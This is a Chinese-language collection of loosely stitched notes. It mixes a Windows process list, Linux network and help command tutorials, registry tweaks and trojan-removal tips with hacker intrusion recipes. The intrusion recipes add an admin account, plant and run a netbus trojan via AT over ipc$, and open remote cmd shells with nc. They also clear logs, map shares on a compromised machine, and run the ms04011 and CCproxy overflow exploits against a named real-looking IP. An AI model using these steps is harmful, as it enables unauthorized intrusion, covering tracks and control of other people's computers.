是否为系统进程: 否

notepad.exe
进程文件: notepad or notepad.exe
进程名称: Notepad
描述: Notepad字符编辑器用于打开文档。在Windows中附带。 
是否为系统进程: 否

ntbackup.exe
进程文件: ntbackup or ntbackup.exe
进程名称: Windows Backup
描述: Windows备份工具用于备份文件和文件夹。 
是否为系统进程: 否

ntvdm.exe
进程文件: ntvdm or ntvdm.exe
进程名称: Windows 16-bit Virtual Machine
描述: Windows Virtual Machine是为了兼容旧的16位Windows和DOS程序而设置的虚拟机。 
是否为系统进程: 否

nvsvc32.exe
进程文件: nvsvc32 or nvsvc32.exe
进程名称: NVIDIA Driver Helper Service
描述: NVIDIA Driver Helper Service在NVIDA显卡驱动中被安装。 
是否为系统进程: 否

nwiz.exe
进程文件: nwiz or nwiz.exe
进程名称: NVIDIA nView Control Panel
描述: NVIDIA nView控制面板在NVIDA显卡驱动中被安装，用于调整和设定。 
是否为系统进程: 否

osa.exe
进程文件: osa or osa.exe
进程名称: Office Startup Assistant
描述: Microsoft Office启动助手，随Windows启动，增强启动、Office字体、命令和Outlook事务提醒等特性。 
是否为系统进程: 否

outlook.exe
进程文件: outlook or outlook.exe
进程名称: Microsoft Outlook
描述: Microsoft Outlook是一个Email客户端包括在Microsoft Office。 
是否为系统进程: 否

photoshop.exe
进程文件: photoshop or photoshop.exe
进程名称: Adobe Photoshop
描述: Adobe Photoshop是一个图像编辑软件，能够打开和编辑照片和其它更多类型格式的图片。 
是否为系统进程: 否

point32.exe
进程文件: point32 or point32.exe
进程名称: Microsoft Intellimouse Monitor
描述: Microsoft Intellimouse Monitor添加一个鼠标设定图标在工具栏。 
是否为系统进程: 否

powerpnt.exe
进程文件: powerpnt or powerpnt.exe
进程名称: Microsoft PowerPoint
描述: Microsoft PowerPoint是一个演示软件包括在Microsoft Office。 
是否为系统进程: 否

pstores.exe
进程文件: pstores or pstores.exe
进程名称: Protected Storage Service
描述: Microsoft Protected Storage服务控制保密的内容密码。 
是否为系统进程: 否

qttask.exe
进程文件: qttask or qttask.exe
进程名称: Quick Time Tray Icon
描述: Quick Time任务栏图标在你运行Quick Time的时候启动。 
是否为系统进程: 否

realplay.exe
进程文件: realplay or realplay.exe
进程名称: Real Player
描述: Real Player是一个媒体播放器用来打开和播放音乐、声音和Real Media格式的视频文件。 
是否为系统进程: 否

rnaapp.exe
进程文件: rnaapp or rnaapp.exe
进程名称: Windows Modem Connection
描述: Windows Modem连接控制用以控制拨号modem连接。 
是否为系统进程: 否

rtvscan.exe
进程文件: rtvscan or rtvscan.exe
进程名称: Norton AntiVirus
描述: Norton Anti-Virus用以扫描你的文件和email中的病毒。 
是否为系统进程: 否

rundll32.exe
进程文件: rundll32 or rundll32.exe
进程名称: Windows RUNDLL32 Helper
描述: Windows Rundll32为了需要调用DLLs的程序。 
是否为系统进程: 否

sndrec32.exe
进程文件: sndrec32 or sndrec32.exe
进程名称: Windows Sound Recorder
描述: Windows录音机用以播放和录制声音文件(.wav)。 
是否为系统进程: 否

sndvol32.exe
进程文件: sndvol32 or sndvol32.exe
进程名称: Windows Volume Control
描述: Windows声音控制进程在任务栏驻留用以控制音量和声卡相关。 
是否为系统进程: 否

spoolss.exe
进程文件: spoolss or spoolss.exe
进程名称: Printer Spooler Subsystem
描述: Windows打印机控制子程序用以调用需要打印的内容从磁盘到打印机。 
是否为系统进程: 否

starter.exe
进程文件: starter or starter.exe
进程名称: Creative Labs Ensoniq Mixer Tray icon
描述: 状态栏图标在Creative Sound Mixer中被安装。为了Creative声卡 (Soundblaster)。 
是否为系统进程: 否

systray.exe
进程文件: systray or systray.exe
进程名称: Windows Power Management
描述: Windows电源管理程序用以控制节能和恢复启动。 
是否为系统进程: 否

tapisrv.exe
进程文件: tapisrv or tapisrv.exe
进程名称: TAPI Service
描述: Windows Telephony (TAPI) 的后台服务程序。 
是否为系统进程: 否

userinit.exe
进程文件: userinit or userinit.exe
进程名称: UserInit Process
描述: UserInit程序运行登陆脚本，建立网络连接和启动Shell壳。 
是否为系统进程: 否

visio.exe
进程文件: visio or visio.exe
进程名称: Microsoft Visio
描述: Microsoft Visio是一个图形化管理软件。 
是否为系统进程: 否

vptray.exe
进程文件: vptray or vptray.exe
进程名称: Norton AntiVirus
描述: Norton Anti-Virus扫描你的文件和email中的病毒。 
是否为系统进程: 否

vshwin32.exe
进程文件: vshwin32 or vshwin32.exe
进程名称: McAfee VirusScan
描述: McAfee VirusScan是一个反病毒软件用以扫描你的文件和email中的病毒。 
是否为系统进程: 否

vsmon.exe
进程文件: vsmon or vsmon.exe
进程名称: True Vector Internet Monitor
描述: True Vector Internet Monitor是ZoneAlarm个人防火墙的一部分，用以监视网络流经数据和攻击。 
是否为系统进程: 否

vsstat.exe
进程文件: vsstat or vsstat.exe
进程名称: McAfee VirusScan
描述: McAfee VirusScan是一个反病毒软件用以扫描你的文件和email中的病毒。 
是否为系统进程: 否


wab.exe
进程文件: wab or wab.exe
进程名称: Address Book
描述: 在Outlook中的地址薄。用来存放email地址、联系信息。 
是否为系统进程: 否

webscanx.exe
进程文件: webscanx or webscanx.exe
进程名称: McAfee VirusScan
描述: McAfee VirusScan是一个反病毒软件用以扫描你的文件和email中的病毒。 
是否为系统进程: 否

winamp.exe
进程文件: winamp or winamp.exe
进程名称: WinAmp
描述: WinAmp Media Player是一个用来打开音乐、声音和视频文件以及用以管理Mp3文件的软件。 
是否为系统进程: 否

winhlp32.exe
进程文件: winhlp32 or winhlp32.exe
进程名称: Windows Help
描述: Windows帮助文件察看程序，用来打开帮助文档。该程序被包括在很多的Windows程序中。 
是否为系统进程: 否

winoa386.mod
进程文件: winoa386 or winoa386.mod
进程名称: MS-DOS Console
描述: Windows MS-DOS控制台用以DOS命令和脚本。 
是否为系统进程: 否

winproj.exe
进程文件: winproj or winproj.exe
进程名称: Microsoft Project
描述: Microsoft Project是一个项目计划编制程序。 
是否为系统进程: 否

winroute.exe
进程文件: winroute or winroute.exe
进程名称: WinRoute
描述: WinRoute是一个基于Windows的防火墙/路由/连接共享软件。 
是否为系统进程: 否

winword.exe
进程文件: winword or winword.exe
进程名称: Microsoft Word
描述: Microsoft Word是一个字处理程序包括在Microsoft Office。 
是否为系统进程: 否

winzip32.exe
进程文件: winzip32 or winzip32.exe
进程名称: WinZip
描述: WinZip是一个文件压缩工具，用于创建，打开和解压zip文件。 
是否为系统进程: 否

wkcalrem.exe
进程文件: wkcalrem or wkcalrem.exe
进程名称: Microsoft Works Calendar Reminder
描述: Microsoft Works Calendar Reminders工作日程提醒，在后台处理和显示弹出计划的工作日志提醒。 
是否为系统进程: 否

wkqkpick.exe
进程文件: wkqkpick or wkqkpick.exe
进程名称: WinZip traybar icon
描述: WinZip的状态栏图标，被允许在Winzip启动时启动。 
是否为系统进程: 否

wmplayer.exe
进程文件: wmplayer or wmplayer.exe
进程名称: Windows Media Player
描述: Windows Media Player是一个用来打开和播放音乐，声音和视频的软件。 
是否为系统进程: 否

wordpad.exe
进程文件: wordpad or wordpad.exe
进程名称: Wordpad
描述: Wordpad是一个字符编辑器用以打开和编辑txt和rtf档。 
是否为系统进程: 否

wowexec.exe
进程文件: wowexec or wowexec.exe
进程名称: Windows On Windows Execution Process
描述: Windows On Windows Execution Support Process和ntvdm.exe作用类似，为了兼容16位应用程序。
是否为系统进程: 否

ypager.exe
进程文件: ypager or ypager.exe
进程名称: Yahoo Messenger Helper
描述: Yahoo Messenger的状态栏图标，随Yahoo Messenger运行，是其一部分。
是否为系统进程: 否


【教你使用netstat命令】
教你使用netstat命令 

netstat命令的功能是显示网络连接、路由表和网络接口信息，可以让用户得知目前都有哪些网络连接正在运作。 
该命令的一般格式为： 

netstat [选项]

命令中各选项的含义如下：

-a 显示所有socket，包括正在监听的。

-c 每隔1秒就重新显示一遍，直到用户中断它。

-i 显示所有网络接口的信息，格式同“ipconfig -e”。

-n 以网络IP地址代替名称，显示出网络连接情形。

-r 显示核心路由表，格式同“route -e”。

-t 显示TCP协议的连接情况。

-u 显示UDP协议的连接情况。

-v 显示正在进行的工作。

[例]在本地机上使用netstat命令。

$ netstat

Active Internet connections （w/o servers）

Proto Recv-Q Send-Q Local Address Foreign Address State 

Active UNIX domain sockets （w/o servers）

Proto RefCnt Flags Type State I-Node Path

unix 1 [ ] STREAM CONNECTED 270 @00000008

unix 1 [ ] STREAM CONNECTED 150 @00000002

unix 1 [ ] STREAM CONNECTED 104 @00000001

unix 1 [ ] STREAM CONNECTED 222 @00000004

unix 1 [ ] STREAM CONNECTED 171 @00000003

unix 1 [ ] STREAM CONNECTED 271 /dev/log

unix 1 [ ] STREAM CONNECTED 225 /dev/log

unix 1 [ ] STREAM CONNECTED 223 /dev/log

unix 1 [ ] STREAM CONNECTED 203 /dev/log

unix 1 [ ] STREAM CONNECTED 105 /dev/log

……

nslookup命令

nslookup命令的功能是查询一台机器的IP地址和其对应的域名。它通常需要一台域名服务器来提供域名服务。如果用户已经设置好域名服务器，就可以用这个命令查看不同主机的IP地址对应的域名。

该命令的一般格式为：

nslookup [IP地址/域名]

[例]在本地机上使用nslookup命令。

$ nslookup

Default Server: name.tlc.com.cn

Address: 192.168.1.99

> 

在符号“>”后面输入要查询的IP地址或域名并回车即可。如果要退出该命令，输入exit并回车即可。

finger命令

finger命令的功能是查询用户的信息，通常会显示系统中某个用户的用户名、主目录、停滞时间、登录时间、登录shell等信息。如果要查询远程机上的用户信息，需要在用户名后面接“@主机名”，采用[用户名@主机名]的格式，不过要查询的网络主机需要运行finger守护进程。

该命令的一般格式为：

finger [选项] [使用者] [用户@主机]

命令中各选项的含义如下：

-s 显示用户的注册名、实际姓名、终端名称、写状态、停滞时间、登录时间等信息。 -l 除了用-s选项显示的信息外，还显示用户主目录、登录shell、邮件状态等信息，以及用户主目录下的.plan、.project和.forward文件的内容。

-p 除了不显示.plan文件和.project文件以外，与-l选项相同。

　

[例]在本地机上使用finger命令。

$ finger xxq

Login: xxq Name: 

Directory: /home/xxq Shell: /bin/bash

Last login Thu Jan 1 21:43 （CST） on tty1

No mail.

No Plan.

　

$ finger

Login Name Tty Idle Login Time Office Office Phone

root root *1 28 Nov 25 09:17

……

ping命令

ping命令用于查看网络上的主机是否在工作，它向该主机发送ICMP ECHO_REQUEST包。有时我们想从网络上的某台主机上下载文件，可是又不知道那台主机是否开着，就需要使用ping命令查看。

该命令的一般格式为：

ping [选项] 主机名/IP地址

命令中各选项的含义如下：

-c 数目 在发送指定数目的包后停止。

-d 设定SO_DEBUG的选项。

-f 大量且快速地送网络封包给一台机器，看它的回应。

-I 秒数 设定间隔几秒送一个网络封包给一台机器，预设值是一秒送一次。

-l 次数 在指定次数内，以最快的方式送封包数据到指定机器（只有超级用户可以使用此选项）。

-q 不显示任何传送封包的信息，只显示最后的结果。

-r 不经由网关而直接送封包到一台机器，通常是查看本机的网络接口是否有问题。

-s 字节数 指定发送的数据字节数，预设值是56，加上8字节的ICMP头，一共是64ICMP数据字节。


TurboLinux系统提供了大量命令和许多实用工具软件，本书由于篇幅的关系，主要介绍了TurboLinux的一些常用命令和实用软件。读者可以使用系统提供的联机帮助手册获取更多的信息。

TurboLinux系统的联机手册中有大量的可用信息，根据其内容分成若干节。在Linux联机帮助手册上，几乎每个命令都有说明。因此，当用户对于Linux上的一个命令不会用或是不太了解时，就请使用联机帮助命令。

本章主要介绍几个常用的联机帮助命令。包括：

man 查询每个命令的使用方法

help 查询Shell命令

whereis 查询某个命令的位置

locate 查询某个文件的位置

man命令

这个命令应该是每个Linux系统上都有的。它格式化并显示在线的手册页。通常使用者只要在命令man后，输入想要获取的命令的名称（例如 ls），man就会列出一份完整的说明，其内容包括命令语法、各选项的意义以及相关命令等。

该命令的一般形式为：

man [选项] 命令名称

命令中各选项的含义分别为：

-M 路径 指定搜索man手册页的路径，通常这个路径由环境变量MANPATH预设，如果在命令行上指定另外的路径，则覆盖MANPATH的设定。

-P 命令 指定所使用的分页程序，缺省使用/usr/bin/lessCis，在环境变量MANPAGER中预设。

-S 章节 由于一个命令名称可能会有很多类别，至于类别，列出如下：

　

章节 说明

1 一般使用者的命令

2 系统调用的命令

3 C语言函数库的命令

4 有关驱动程序和系统设备的解释

5 配置文件的解释

6 游戏程序的命令

7 其他的软件或是程序的命令


有关系统维护的命令 

　

-a 显示所有的手册页，而不是只显示第一个。

-d 这个选项主要在检查时使用，如果用户加入了一个新的文件，就可以用这个选项检查是否出错，这个选项并不会列出文件内容。

-f 只显示出命令的功能而不显示其中详细的说明文件。

-p string 设定运行的预先处理程序的顺序，共有下列几项：

e eqn t tbl

g grap r refer

p pic v vgrind

-w 不显示手册页，只显示将被格式化和显示的文件所在位置。

例如：查看cd命令的使用方法。

$ man cd

cd（n） Tcl Built-In Commands cd（n）

_________________________________________________________________

NAME

cd - Change working directory

SYNOPSIS

cd ?dirName?

_________________________________________________________________

DEs criptION

Change the current working directory to dirName, or to the

home directory （as specified in the HOME environment vari-

able） if dirName is not given. Returns an empty string.

KEYWORDS

working directory

Tcl 1

（END）

可以按q键退出man命令。

help命令

help命令用于查看所有Shell命令。用户可以通过该命令寻求Shell命令的用法，只需在所查找的命令后输入help命令，就可以看到所查命令的内容了。

　

例如：查看od命令的使用方法。

$ od --help

　whereis命令

这个程序的主要功能是寻找一个命令所在的位置。例如，我们最常用的ls命令，它是在/bin这个目录下的。如果希望知道某个命令存在哪一个目录下，可以用whereis命令来查询。

该命令的一般形式为：

whereis [选项] 命令名

说明：一般直接使用不加选项的whereis命令，但用户也可根据特殊需要选用它的一些选项。

该命令中各选项的含义分别为：

b 只查找二进制文件

m 查找主要文件

s 查找来源

u 查找不常用的记录文件

例如：查找ls命令在什么目录下。

$ whereis ls

ls:/bin/ls/usr/man/man1/ls.1 



【新建 文本文档 (2)】
命令：Tasklist

　　功能：显示本地或远程机器上当前运行的进程列表。查看到打开的进程后，就能配合Taskkill命令来结束本地或远程电脑上的进程。

　　语法：Tasklist[.exe] [/s Computer] [/u Domain\User [/p Password]] [{/m Module | /svc | /v}] [/fo {TABLE | LIST | CSV}] [/nh] [/fi FilterName [/fi FilterName2 [ ... ]]]

　　参数：

　　/s Computer――指定远程计算机名称或 IP 地址（不能使用反斜杠，其实它相当于指明路径）。默认值是本地计算机；

　　/u Domain\User――以 User 或 Domain\User 指定的用户账户权限运行命令。默认值是当前登录发布命令的计算机用户具有的权限。其中Domain表示工作组，User表示用户名；

　　/p Password――指定 /u 参数中指定用户账户的密码；

　　/m Module――列出与给定模式名称匹配的加载了 DLL 模块的所有任务。如果未指定模块名称，该选项将显示每个任务加载的所有模块；

　　/svc――不间断地列出每个过程的所有服务信息；

　　/v：指定显示在输出结果中的详细任务信息。要在没有截断的情况下查看完整的详细输出，请与 /svc 参数一同使用；
提升权限命令  net localgroup administrators aaa /add                    (aaa 自定义)
显示进程命令  Tasklist
调用进程命令  Tasklist /fi "imagename eq svtarge.exe"                  (svtarge.exe 自定义)
强行关闭进程命令 Taskkill /fi "imagename eq svtarge.exe" /f          (svtarge.exe 自定义)


【新建 文本文档】
201.89  sxy02

5.at： 排定在特定的日期和时间运行某些命令和程序。 
运行 AT 命令之前必须先启动 Schedule 服务。瞧，现炒就得现卖，刚学了net命令，但这个start命令我可没详述，自已看看帮助文件，摸索一下各种命令的用法吧。 
C：》net start schedule 
Schedule 正在启动服务..... 
Schedulw 服务启动成功。 
AT ［computername］ ［ ［id］ ［／DELETE］ ／DELETE ［／YES］］ 
AT ［computername］ time ［／INTERACTIVE］ 
［ ／EVERY：date［，...］ ／NEXT：date［，...］］ "command" 
computername 指定远程计算机。 如果省略这个参数 
命令会被排定在本机上运行。 
id 指定给排定进度命令的识别号。 
／delete 删除某个已排定进度的命令。如果省略标识，计算机上所有已排定进度的 
命令都会被删除。 
／yes 用于删除所有作业，且不想在运行删除时显示确认 
信息 。 
time 指定命令运行的时间。 
／interactive 允许作业在运行时，与用户通过桌面交互。 
／every：date［，...］ 指定在每周或每月的某日 （或某几日） 运行命令。 
如果省略日期，则默认为在每月的本日运行。 
／next：date［，...］ 指定在下一个指定日期 （如，下周三），运行命令。 
如果省略日期，则默认为在每月的本日运行。 
"command" 准备运行的 Windows NT 命令或批处理文件。 
知道了如何使用AT，再来看看如何在远程NT上运行ntsrv.exe： 
1 利用管理员登陆到目的服务器，方法为： net use x.x.x.xipc￥ "adminpwd" ／user："adminuser"（这里具体方法可参见KILLUSA的文章《HOW TO GET IN NT》） 
2 利用ntsrv.exe启动远程： netsvc x.x.x.x schedule ／start 
3 利用AT.EXE在远程服务器设置程序定时运行，当然最快运行最理想，所以，你可以用letmein.exe得到服务器的时间，然后： 
at x.x.x.x 00：00 ntsrv.exe ／port：64321 
其中00：00要改为用letmein.exe得回来的具体时间+一点容量，等一会后，再在本地启动netbus.exe，键入目的服务器得ip地址或hostname，连接！比如第一种方法，你想要在目的服务器运行诸如病毒之类的东东，可以利用netbus得上传功能，将各种“大补丸”上传至目的服务器，再用netbus的"Start program"，键入完整路径，就ok了！第二种方法是利用netbus的“App redirect”功能，启动远程telnet服务，如下：在netbus中击“App redirect”，键入"C：》winntsystem32cmd.exe"，Port为：4321，服务就启动了，然后在本地运行：nc x.x.x.x 4321，出现dos启动的画面就表示连接成功： 
Microsoft（R） Windows NT（TM） 
（C） Copyright 1985-1996 Microsoft Corp. 
C：》 
注：这里有一小段是抄KILLUSA的文章――别找我要稿费啊^&^ 



禁止ipc$默认共享的方法 

　 
以下四种方法可以参考一下: 
A、一种办法是把ipc$和默认共享都删除了。但重起后还会有。这就需要改注册表。 
1，先把已有的删除 
net share ipc$ /del 
net share admin$ /del 
net share c$ /del 
…………（有几个删几个） 
2，禁止建立空连接 
  首先运行regedit，找到如下主键[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlLSA] 

把RestrictAnonymous（DWORD）的键值改为：00000001。 
  3，禁止自动打开默认共享 
  

对于server版，找到如下主键[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesLanmanServerPara 

meters]把AutoShareServer（DWORD）的键值改为:00000000。 
对于pro版，则是[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesLanmanServerParameters]把Au 

toShareWks（DWORD）的键值改为:00000000。 
B、另一种是关闭ipc$和默认共享依赖的服务（不推荐） 
net stop lanmanserver 
可能会有提示说，XXX服务也会关闭是否继续。因为还有些次要的服务依赖于lanmanserver。一般情况按y继续就可以了。 
C、最简单的办法是设置复杂密码，防止通过ipc$穷举密码。但如果你有其他漏洞，ipc$将为进一步入侵提供方便。 
D、还有一个办法就是装防火墙，或者端口过滤。

【日志清除】
C:\winnt\system32\logfiles\*.* 
C:\winnt\ssytem32\config\*.evt 
C:\winnt\system32\dtclog\*.* 
C:\winnt\system32\*.log 
C:\winnt\system32\*.txt 
C:\winnt\*.txt 
C:\winnt\*.log 


【映射对方盘符】
telnet到他的机器上，
运行：
>net share 查看有没有默认共享？如果没有，那么就接着运行
>net share c$=c:
>net share d$=d:
>net share现在看看应该有了c$和d$了吧？

在自己的机器上运行
>net use k: \\*.*.*.*\c$ 把目标共享映射到本地硬盘，盘符为K！ 
哈哈！
打开你的资源管理器看看吧！
嘿嘿。。。

想吃红糖吃红糖，想吃白糖吃白糖！
吃一匙，扔一匙！ 

最后，别忘了退出来。
在自己的机器运行
>net use k: /delete
Telnet到肉鸡，运行
>net share c$ /delete
>net share d$ /delete


【木马和未授权远程控制软件的关闭】
木马和未授权远程控制软件的关闭


--------------------------------------------------------------------------------


以下各种木马及未授权被安装的远程控制软件均由于您没有正确的设置您的管理员密
码造成的。请先检查系统中所有帐号的口令是否设置的足够安全。 



口令设置要求：
1.口令应该不少于8个字符；
2.不包含字典里的单词、不包括姓氏的汉语拼音；
3.同时包含多种类型的字符，比如　　
o大写字母(A,B,C,..Z)
o小写字母(a,b,c..z)
o数字(0,1,2,…9)
o标点符号(@,#,!,$,%,& …)


win2000口令设置方法:
当前用户口令：
在桌面环境下按crtl+alt+del键后弹出选项单，选择其中的更改密码项后按要求输入你的密码
（注意：如果以前administrator没有设置密码的话，旧密码那项就不用输入，只需直接输入新的
密码）。
其他用户口令：
在开始->控制面板->用户和密码->选定一个用户名->点击设置密码


113端口木马的清除（仅适用于windows系统）：
这是一个基于irc聊天室控制的木马程序。
1.首先使用netstat -an命令确定自己的系统上是否开放了113端口
2.使用fport命令察看出是哪个程序在监听113端口
fport工具下载
例如我们用fport看到如下结果：
Pid Process Port Proto Path
392 svchost -> 113 TCP C:\WINNT\system32\vhos.exe


我们就可以确定在监听在113端口的木马程序是vhos.exe而该程序所在的路径为
c:\winnt\system32下。
3.确定了木马程序名（就是监听113端口的程序）后，在任务管理器中查找到该进程，
并使用管理器结束该进程。
4.在开始-运行中键入regedit运行注册表管理程序，在注册表里查找刚才找到那个程序，
并将相关的键值全部删掉。
5.到木马程序所在的目录下删除该木马程序。（通常木马还会包括其他一些程序，如
rscan.exe、psexec.exe、ipcpass.dic、ipcscan.txt等，根据
木马程序不同，文件也有所不同，你可以通过察看程序的生成和修改的时间来确定与
监听113端口的木马程序有关的其他程序）
6.重新启动机器。


3389端口的关闭：
首先说明3389端口是windows的远程管理终端所开的端口，它并不是一个木马程序，请先
确定该服务是否是你自己开放的。如果不是必须的，请关闭该服务。


win2000关闭的方法：
win2000server 开始-->程序-->管理工具-->服务里找到Terminal Services服务项，
选中属性选项将启动类型改成手动，并停止该服务。
win2000pro 开始-->设置-->控制面板-->管理工具-->服务里找到Terminal Services
服务项，选中属性选项将启动类型改成手动，并停止该服务。
winxp关闭的方法：
在我的电脑上点右键选属性-->远程，将里面的远程协助和远程桌面两个选项框里的勾去掉。


4899端口的关闭：
首先说明4899端口是一个远程控制软件（remote administrator)服务端监听的端口，他不能
算是一个木马程序，但是具有远程控制功能，通常杀毒软件是无法查出它来的，请先确定该服
务是否是你自己开放并且是必需的。如果不是请关闭它。


关闭4899端口：
请在开始-->运行中输入cmd(98以下为command),然后cd C:\winnt\system32(你的系统
安装目录），输入r_server.exe /stop后按回车。
然后在输入r_server /uninstall /silence


到C:\winnt\system32(系统目录）下删除r_server.exe admdll.dll radbrv.dll三个文件



5800，5900端口：
1.首先使用fport命令确定出监听在5800和5900端口的程序所在位置（通常会是c:\winnt\fonts\
explorer.exe)
2.在任务管理器中杀掉相关的进程（注意有一个是系统本身正常的，请注意！如果错杀可以重新
运行c:\winnt\explorer.exe)
3.删除C:\winnt\fonts\中的explorer.exe程序。
4.删除注册表HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run中的
Explorer项。
5.重新启动机器。


6129端口的关闭：
首先说明6129端口是一个远程控制软件（dameware nt utilities)服务端监听得端口，他不是
一个木马程序，但是具有远程控制功能，通常的杀毒软件是无法查出它来的。请先确定该服务
是否是你自己安装并且是必需的，如果不是请关闭。


关闭6129端口：
选择开始-->设置-->控制面板-->管理工具-->服务
找到DameWare Mini Remote Control项点击右键选择属性选项，将启动类型改成禁用后
停止该服务。
到c:\winnt\system32(系统目录）下将DWRCS.EXE程序删除。
到注册表内将HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\DWMRCS表项删除。


1029端口和20168端口：
这两个端口是lovgate蠕虫所开放的后门端口。
蠕虫相关信息请参见：Lovgate蠕虫
你可以下载专杀工具：FixLGate.exe
使用方法：下载后直接运行，在该程序运行结束后重起机器后再运行一遍该程序。



45576端口：
这是一个代理软件的控制端口，请先确定该代理软件并非你自己安装（代理软件会给你的机器带
来额外的流量）
关闭代理软件：
1.请先使用fport察看出该代理软件所在的位置
2.在服务中关闭该服务（通常为SkSocks），将该服务关掉。
3.到该程序所在目录下将该程序删除。



【注册表禁用30项】
   注册表禁用30项

本文作者： 未知 文章录入：safer
文章出处： 未知 
阅读次数： 47
发布日期： 2003-10-23 
我们知道在注册表的“HKEY＿CURRENT＿USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer”子键下通过建立新的项及设置不同的键值可以禁用“我的电脑”中的驱动器，禁用“查找”、“运行”等功能，其实在这个子键下还可以通过新建其它一些键值来禁用更多的功能，下面将部分禁用的项目简介如下，供有兴趣的朋友参考。
1．新建二进制键值NoDriveTypeAutoRun，设置键值为b5，00，00，00，禁用光盘自动运行；
2．新建dword键值EditLevel，设置键值为1，禁用开始菜单中“程序”上的水平线；
3．新建二进制键值NoStartBanner，设置键值为01，00，00，00，禁用单击“从这里开始”动画箭头；
4．新建dword键值NoFavoritesMenu，设置键值为1，禁用开始菜单中的“收藏夹”；
5．新建dword键值NoRecentDocsMenu，设置键值为1，禁用开始菜单中的“文档”；
6．新建dword键值Nofind，设置键值为1，禁用开始菜单中的“查找”；
7．新建dword键值NoRun，设置键值为1，禁用开始菜单中的“运行”；
8．新建dword键值NoLogOff，设置键值为1，禁用开始菜单中的“注销”；
9．新建dword键值NoClose，设置键值为1，禁用开始菜单中的“关闭”；
10．新建二进制键值NoRecentDocsHistory，设置键值为01，00，00，00，不保存新近打开的文档历史记录；
11．新建二进制键值ClearRecentDocsonExit，设置键值为01，00，00，00，退出时自动删除“运行”、“查找”中的历史记录，与第10项一起设置，自动清除新近打开的所有文档的历史记录；
12．新建dword键值NoNetHood，设置键值为1，禁用“网上邻居”图标；
13．新建dword键值NoInternetIcon，设置键值为1，禁用IE浏览器图标；
14．新建dword键值NoSaveSettings，设置键值为1，禁用退出时保存设置(锁定桌面)；
15．新建二进制键值NoDrives，键值设置为01，00，00，00禁用A驱动器，设置为ffffffff禁用所有驱动器；
16．新建dword键值NoFileMenu，设置键值为1，禁用“我的电脑”、“资源管理器”及“我的文档”中的“文件”菜单；
17．新建dword键值NoActiveDesktop，设置键值为1，禁用显示属性中的“Web”选项卡；
18．新建dword键值NoChangeStartMenu，设置键值为1，禁用在开始菜单中拖放快捷菜单；
19．新建dword键值NoViewContextMenu，设置键值为1，禁用右键快捷菜单；
20．新建dword键值NoTrayContextMenu，设置键值为1，禁用任务栏的快捷菜单；
21．新建dword键值NoDesktop，设置键值为1，禁用桌面上的所有图标选项；
22．新建dword键值NoAddPrinter，设置键值为1，在打印机文件夹中禁用“添加打印机”；
23．新建dword键值NoDeletePrinter，设置键值为1，在打印机文件夹中禁用“删除打印机”；
24．新建dword键值NoPrinterTabs，设置键值为1，禁用打印机属性中的“常规”和“详细”选项卡；
25．新建dword键值NoSetFolders，设置键值为1，禁用“设置”中的“控制面板”和“打印机”
26．新建dword键值NoSetTaskbar，设置键值为1，禁用“设置”中的“任务栏属性和开始菜单”；
27．新建dword键值NofolderOptions，设置键值为1，禁用“设置”菜单中的“文件夹选项”；
28．新建dword键值NoSetActiveDesktop，设置键值为1，禁用“设置”菜单中的“活动桌面”；
29．新建dword键值NoWindowsUpdate，设置键值为1，禁用“设置”菜单中的“WindowsUpdate”选项；
30．上述第25、26、27、28、29五项全部禁用后则可以在开始菜单中删除“设置”选项。 


【注册表还原】
开机进纯dos，输入：scanreg。有五个注册表备份
加个参数吧 /restore 

【漏洞大全】

　
黑客攻防 漏洞大全

文章 
总目录| 漏洞大全 | 
 经典漏洞：ms04011 
can.exe      扫描程序                就是 dsscan.exe
g.exe        检测系统类型            就是 getos.exe
m.exe        溢出程序                就是 ms04011.exe    
nc.exe       监听端口(瑞士军刀)      很老的工具 你应该有的 没有的话我也添加了

can.exe      扫描程序                就是 dsscan.exe
g.exe        检测系统类型            就是 getos.exe
m.exe        溢出程序                就是 ms04011.exe    
nc.exe       监听端口(瑞士军刀)      很老的工具 你应该有的 没有的话我也添加了  

Windows Lsasrv.dll RPC [ms04011] buffer overflow Remote Exploit


m.exe 系统类型（0或者1） 对方ip 你监听断口 你的ip

前提要你的机子要公网ip。或者你也可以用3389登入肉鸡，进行溢出。

第一步扫描：      scan.exe  出现VULNERABLE就是可以益出 ，现成的节约时间218.5.67.154。

第二步用：        g.exe 察看系统类型

第三步监听本地端口：nc -vv -l -p 1234

*再开一个cmd窗口*

第四步溢出：m.exe 

格式:       m 0 对方ip 本地监听端口 自己的ip

            m 1 202.x.X.X 1234 202.X.X.X

看到了吧。得到system32。自己想干什么.......^_^

- 作者： 小小杀手 2005年01月31日, 星期一 12:29　 回复（0） |　 引用（0） 加入博采 
 CCproxy溢出漏洞 
CCproxy 是一个应用广泛的代理程序
要找有ccproxy主的主机，扫描它是否开放808,2080,2121,21 如果开了这样的端口一般都安装了ccproxy
下面我们就溢出它，很简单的。

CCproxy 是一个应用广泛的代理程序
要找有ccproxy主的主机，扫描它是否开放808,2080,2121,21 如果开了这样的端口一般都安装了ccproxy
下面我们就溢出它，很简单的。
一，运行 
D:\>ccproxyexp.exe
Usage: ccproxyexp.exe <target_ip> [target_port]
      www.77169.com

二，溢出

target_ip 是溢出主机的ip，就是要攻击主机的ip
比如我们要攻击 127.0.0.1
target_port 是要攻击的端口，ccproxy默认是808 如果你不填就是默认808，
如果对方改了端口比如改成了 809 ，我们只要给tartget_port 改成809
例：
如果默认没改端口
ccproxyexp.exe 127.0.0.1 
ccproxyexp.exe 127.0.0.1 808
两条指令是相同的意义用那条都可以

如果改成了809
攻击指令
ccproxyexp.exe 127.0.0.1 809


下面我们来实践
一，开始->运行cmd 
二，输入指令 ccproxyexp.exe 127.0.0.1 
D:\exp>ccpx.exe 127.0.0.1
本主机IP是否与目标主机IP在同一个网段？[y/n] y
[+] connecting to 127.0.0.1:808
[+] send magic buffer...
[+] connecting to CMD shell port...
Microsoft Windows 2000 [Version 5.00.2195]
(C) 版权所有 1985-2000 Microsoft Corp.

C:\winnt\system32


OK成功溢出 本次测试运行平台 Windows 2000，可能对6.0以下版本有效。

- 作者： 小小杀手 2005年01月31日, 星期一 12:26　 回复（0） |　 引用（0） 加入博采 
 经典漏洞：dcomrpc 
需要的工具： 
很好的： radmin.exe 
扫描工具: retinarpcdcom.exe 
